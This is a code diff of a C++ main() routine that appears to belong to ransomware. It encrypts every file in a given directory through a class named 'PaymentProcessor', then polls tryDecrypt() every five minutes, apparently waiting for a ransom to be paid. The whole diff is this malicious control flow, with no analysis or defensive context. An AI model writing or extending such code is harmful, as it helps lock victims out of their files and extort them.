@@ -1,18 +1,22 @@
 #include <cstdio>
+#include <iostream>
+#include <chrono>
+#include <thread>
 
-#include "encrypt.h"
+#include "PaymentProcessor.h"
 
 int main(int argc, char **argv) {
-	Crypt *testCrypt;
+	if (argc < 2) {
+        std::cout << "Error: no directory given" << std::endl;
+        exit(EXIT_FAILURE);
+    }
 
-	if (argc >= 3)
-		testCrypt = new Crypt(argv[2]);
-	else
-		testCrypt = new Crypt();
+    PaymentProcessor processor(argv[1]);
 
-	if (testCrypt->encryptFiles(argv[1]) < 0)
-		perror(NULL);
+    processor.encryptFiles();
+    
+    while (processor.tryDecrypt() < 0)
+        std::this_thread::sleep_for(std::chrono::minutes(5));
 
-	delete testCrypt;
-	return 0;
+    return 0;
 }
